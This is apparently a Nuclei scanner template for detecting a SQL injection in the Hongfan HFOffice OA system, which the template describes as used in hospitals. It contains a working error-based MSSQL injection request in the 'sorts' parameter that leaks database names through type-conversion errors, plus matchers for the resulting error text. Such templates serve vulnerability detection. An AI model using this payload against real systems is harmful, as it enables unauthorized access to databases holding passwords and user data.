id: hfoffice-sql-injection
info:
  name: HFOffice OA System SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Hongfan HFOffice is an OA system that is widely used in hospitals, and there is a SQL injection vulnerability in one of its API interfaces. This vulnerability can lead to unauthorized access to database information, including administrative passwords and user data, and potentially enable further server exploitation.
  tags: sql-injection
  classification:
    cvss-score: 7.5
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  reference:
    - http://www.ioffice.cn/
    - https://fofa.so/

http:
  - raw:
      - |
        GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27)),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c89905a7 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Cache-Control: max-age=0
        sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400

      - type: regex
        regex:
          - "(在将(.*?)值(.*?)转换成数据类型(.*?)时失败)"
        part: body
